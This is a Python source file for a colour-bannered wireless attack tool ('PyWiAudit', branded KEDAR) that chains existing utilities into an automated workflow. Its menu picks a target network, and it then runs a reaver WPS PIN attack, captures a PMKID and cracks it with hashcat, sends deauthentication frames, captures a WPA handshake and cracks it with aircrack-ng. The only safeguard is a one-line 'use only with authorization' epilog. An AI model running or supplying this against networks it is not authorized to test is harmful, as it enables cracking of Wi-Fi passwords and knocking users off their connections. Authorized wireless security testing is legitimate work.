#!/usr/bin/env python3
import subprocess
import argparse
import time
import os
import sys
import json
import threading
from datetime import datetime
from colorama import Fore, Style, init
import signal

init(autoreset=True)

VERSION = "2.1"
AUTHOR = "Michael Nkomo"
BANNER = f"""
{Fore.RED}  _  __{Fore.GREEN} ______{Fore.YELLOW}  _____{Fore.BLUE}     ____{Fore.MAGENTA}  _______{Fore.GREEN}
{Fore.RED} | |/ /{Fore.GREEN}|  ____|{Fore.YELLOW}|  __ \\{Fore.BLUE} / /__\ \{Fore.MAGENTA}|   __   |{Fore.GREEN}
{Fore.RED} | ' / {Fore.GREEN}| |__   {Fore.YELLOW}| |  | |{Fore.BLUE} | |  | |{Fore.MAGENTA}|  |   \ /{Fore.GREEN}
{Fore.RED} |  <  {Fore.GREEN}|  __|  {Fore.YELLOW}| |  | |{Fore.BLUE} | |__| |{Fore.MAGENTA}|  |___/ \{Fore.GREEN}
{Fore.RED} | . \\ {Fore.GREEN}| |____ {Fore.YELLOW}| |__| |{Fore.BLUE}| |__| |{Fore.MAGENTA}|  |___   |{Fore.GREEN}
{Fore.RED} |_|\\_\\{Fore.GREEN}|______|{Fore.YELLOW}|_____/{Fore.BLUE}| |  | |{Fore.MAGENTA}|__|   |__|{Fore.GREEN}
"""
REQUIRED_TOOLS = ['aircrack-ng', 'iwconfig', 'tshark', 'hcxdumptool', 'wash', 'reaver', 'aireplay-ng']
SESSION_FILE = "pywiaudit.session"
OUTPUT_DIR = "captures"

class CLIAnimator:
    @staticmethod
    def kedar_initialization():
        colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA]
        print(f"\n{Fore.WHITE}Initializing ", end='', flush=True)
        for char in "KEDAR":
            print(f"{colors.pop(0)}{char}", end='', flush=True)
            time.sleep(0.1)
        print(Style.RESET_ALL)
        time.sleep(0.5)
        print(BANNER)
        time.sleep(0.2)
        print(f"{Fore.CYAN}Wireless Audit Framework v{VERSION}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Created by {AUTHOR}{Style.RESET_ALL}\n")
        time.sleep(0.3)

    @staticmethod
    def loading_spinner(message):
        spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        delay = 0.1
        stop = False
        def run():
            i = 0
            while not stop:
                print(f"\r{Fore.CYAN}{spinner[i]}{Style.RESET_ALL} {message}  ", end='', flush=True)
                i = (i + 1) % len(spinner)
                time.sleep(delay)
        t = threading.Thread(target=run)
        t.start()
        return lambda: (globals().update(stop=True), t.join())

class WirelessAuditTool:
    def __init__(self, args):
        CLIAnimator.kedar_initialization()
        self.args = args
        self.interface = args.interface
        self.wordlist = args.wordlist
        self.target = None
        self.session = {}
        self.monitor_interface = None
        self.validate_root()
        self.check_dependencies()
        self.setup_output_dir()
        self.load_session()

    def validate_root(self):
        if os.geteuid() != 0:
            self.exit_error("Root privileges required. Use sudo.")

    def check_dependencies(self):
        missing = [t for t in REQUIRED_TOOLS if not self.command_exists(t)]
        if missing: self.exit_error(f"Missing tools: {', '.join(missing)}")

    def setup_output_dir(self):
        os.makedirs(OUTPUT_DIR, exist_ok=True)

    def load_session(self):
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE) as f: self.session = json.load(f)

    def save_session(self):
        with open(SESSION_FILE, 'w') as f: json.dump(self.session, f)

    def exit_error(self, message):
        print(f"\n{Fore.RED}[-] ERROR: {message}{Style.RESET_ALL}")
        sys.exit(1)

    def command_exists(self, cmd):
        return subprocess.call(f"command -v {cmd}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

    def enable_monitor_mode(self):
        stop_spinner = CLIAnimator.loading_spinner("Configuring monitor mode")
        try:
            subprocess.run(['airmon-ng', 'check', 'kill'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
            subprocess.run(['iw', self.interface, 'set', 'monitor', 'control'], check=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
            self.monitor_interface = self.interface
            stop_spinner()
            print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} Monitor mode enabled")
        except Exception as e:
            stop_spinner()
            self.exit_error(f"Monitor mode failed: {e}")

    def scan_networks(self):
        stop_spinner = CLIAnimator.loading_spinner("Scanning networks")
        networks = []
        try:
            wash_proc = subprocess.Popen(['wash', '-i', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            time.sleep(15)
            wash_proc.terminate()
            stdout, _ = wash_proc.communicate()
            for line in stdout.split('\n'):
                if not line.strip() or 'BSSID' in line: continue
                parts = line.split()
                if len(parts) >= 6:
                    networks.append({
                        'bssid': parts[0], 'channel': parts[1],
                        'wps_version': parts[3], 'wps_locked': 'No' if 'Yes' not in parts[4] else 'Yes',
                        'essid': ' '.join(parts[5:])
                    })
            stop_spinner()
            print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} Found {len(networks)} networks")
            return networks
        except Exception as e:
            stop_spinner()
            self.exit_error(f"Scan failed: {e}")

    def wps_pin_attack(self, target):
        print(f"\n{Fore.CYAN}[*] Starting WPS PIN attack...{Style.RESET_ALL}")
        try:
            subprocess.run(['reaver', '-i', self.interface, '-b', target['bssid'], '-c', target['channel'], '-vv', '-K', '1'], check=True)
        except:
            print(f"{Fore.RED}[-] WPS attack failed{Style.RESET_ALL}")

    def capture_pmkid(self, target):
        stop_spinner = CLIAnimator.loading_spinner("Capturing PMKID")
        try:
            output_file = os.path.join(OUTPUT_DIR, f"pmkid_{target['bssid'].replace(':', '')}")
            hcxdump = subprocess.Popen(['hcxdumptool', '-i', self.interface, '-o', output_file, '--enable_status=1'])
            start = time.time()
            while time.time() - start < 120:
                time.sleep(10)
                if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                    hcxdump.terminate()
                    subprocess.run(['hcxpcaptool', '-z', f"{output_file}.hash", output_file], check=True)
                    stop_spinner()
                    print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} PMKID captured")
                    if self.wordlist: return self.crack_pmkid(f"{output_file}.hash")
                    return True
            return False
        except Exception as e:
            stop_spinner()
            print(f"\r{Fore.RED}✖{Style.RESET_ALL} PMKID error: {e}")
            return False

    def crack_pmkid(self, hash_file):
        print(f"\n{Fore.CYAN}[*] Cracking PMKID with hashcat...{Style.RESET_ALL}")
        try:
            subprocess.run(['hashcat', '-m', '16800', hash_file, self.wordlist, '--force'], check=True)
            return True
        except:
            print(f"{Fore.RED}[-] Cracking failed{Style.RESET_ALL}")
            return False

    def deauth_attack(self, target, count=3):
        print(f"\n{Fore.YELLOW}[*] Starting deauthentication...{Style.RESET_ALL}")
        try:
            subprocess.run(['aireplay-ng', '--deauth', str(count), '-a', target['bssid'], self.interface], check=True)
        except:
            print(f"{Fore.RED}[-] Deauth failed{Style.RESET_ALL}")

    def capture_handshake(self, target):
        stop_spinner = CLIAnimator.loading_spinner("Capturing handshake")
        try:
            output_file = os.path.join(OUTPUT_DIR, f"handshake_{target['bssid'].replace(':', '')}")
            dump = subprocess.Popen(['airodump-ng', '-c', target['channel'], '--bssid', target['bssid'], '-w', output_file, self.interface])
            start = time.time()
            while time.time() - start < 120:
                time.sleep(5)
                if self.check_handshake(f"{output_file}-01.cap"):
                    dump.terminate()
                    stop_spinner()
                    print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} Handshake captured")
                    if self.wordlist: self.crack_handshake(f"{output_file}-01.cap", target)
                    return True
            return False
        except Exception as e:
            stop_spinner()
            print(f"\r{Fore.RED}✖{Style.RESET_ALL} Handshake error: {e}")
            return False

    def check_handshake(self, cap_file):
        try:
            result = subprocess.run(['tshark', '-r', cap_file, '-Y', 'eapol'], capture_output=True, text=True)
            return 'EAPOL' in result.stdout
        except:
            return False

    def crack_handshake(self, cap_file, target):
        print(f"\n{Fore.CYAN}[*] Cracking handshake...{Style.RESET_ALL}")
        try:
            subprocess.run(['aircrack-ng', '-w', self.wordlist, '-b', target['bssid'], cap_file], check=True)
        except:
            print(f"{Fore.RED}[-] Handshake cracking failed{Style.RESET_ALL}")

    def interactive_menu(self, networks):
        print(f"\n{Fore.WHITE}Available Networks:{Style.RESET_ALL}")
        for idx, net in enumerate(networks, 1):
            print(f"{idx}. {net['essid']} ({net['bssid']})")
            print(f"   Channel: {net['channel']} | WPS: {net['wps_locked']}")
        try:
            choice = int(input("\nSelect target: ")) - 1
            self.target = networks[choice]
            print(f"{Fore.CYAN}[*] Target: {self.target['essid']}{Style.RESET_ALL}")
        except:
            self.exit_error("Invalid selection")

    def cleanup(self):
        print(f"\n{Fore.CYAN}[*] Cleaning up...{Style.RESET_ALL}")
        subprocess.run(['airmon-ng', 'stop', self.interface], stdout=subprocess.DEVNULL)
        self.save_session()

    def signal_handler(self, sig, frame):
        self.cleanup()
        sys.exit(0)

    def main(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        self.enable_monitor_mode()
        networks = self.scan_networks()
        if not networks: self.exit_error("No networks found")
        self.interactive_menu(networks)
        if self.target.get('wps_locked') == 'No': self.wps_pin_attack(self.target)
        if not self.capture_pmkid(self.target): self.capture_handshake(self.target)
        self.cleanup()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=f"PyWiAudit v{VERSION}", epilog=f"{BANNER}\nAuthor: {AUTHOR}\nLegal: Use only with authorization")
    parser.add_argument('-i', '--interface', required=True, help="Wireless interface")
    parser.add_argument('-w', '--wordlist', help="Wordlist path")
    args = parser.parse_args()
    WirelessAuditTool(args).main()
